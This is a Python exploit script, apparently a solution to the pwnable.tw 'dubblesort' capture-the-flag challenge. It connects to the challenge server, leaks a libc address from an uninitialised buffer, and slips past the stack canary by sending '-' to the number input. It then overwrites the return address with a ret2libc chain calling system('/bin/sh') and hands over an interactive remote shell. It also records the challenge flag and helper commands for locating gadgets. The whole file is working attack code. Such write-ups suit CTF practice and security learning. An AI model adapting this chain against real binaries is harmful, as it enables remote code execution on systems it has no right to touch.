import socket
import time
import struct
import telnetlib

# SERVER = ('localhost', 1234)
SERVER = ('chall.pwnable.tw', 10101)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
s.connect(SERVER)
print(s.recv(1024))

def info_leak():
    buf = b'a' * 24
    buf += b'\n'
    s.send(buf)
    data = s.recv(1024)
    data = data.lstrip(b'Hello ' + buf[:-1])
    data = data[:4]
    data = struct.unpack('<I', data)[0]
    return data & ~0xff

def rop_chain(system, binsh):
    payload = []
    buf = '{}\n'.format(system).encode('utf-8')
    payload.append(buf)
    buf = '{}\n'.format(binsh).encode('utf-8')
    payload.append(buf)
    payload.append(buf)
    return payload

system_offset = 0x3a940
binsh_offset = 0x00158e8b
# binsh_offset = 0x0015902b

leak = info_leak()
print('[+] libc base (rw-): {}'.format(hex(leak)))
libc_base = leak - 1769472

system = libc_base + system_offset
binsh = libc_base + binsh_offset

print('[+] libc base (r-x): {}'.format(hex(libc_base)))
print('[+] system@libc: {}'.format(hex(system)))
print('[+] /bin/sh: {}'.format(hex(binsh)))

# 24 (trash) + 1 (canary) + 7 (trash) + 1 (eip) + 2 (rop)
s.send(b'35\n')

for i in range(24):
    s.recv(1024)
    s.send(b'97\n')
s.recv(1024)
s.send(b'-\n')

for i in range(7):
    time.sleep(0.2)
    s.recv(1024)
    # 0xdeadbeef
    s.send(b'3735928559\n')

payload = rop_chain(system, binsh)
for buf in payload:
    time.sleep(0.2)
    s.recv(1024)
    s.send(buf)

print('[*] Sending exploit')
data = s.recv(1024)
time.sleep(2)
data = s.recv(1024)
data = data.lstrip(b'Result :\n')
data = data.split()
data = list(map(lambda x: hex(int(x)), data))

print('[*] Spawning shell')
t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()

# FLAG{Dubo_duBo_dub0_s0rttttttt}

'''
$ ROPgadget --binary libc_32.so.6 --string /bin/sh
$ objdump -d libc_32.so.6 | grep system
'''
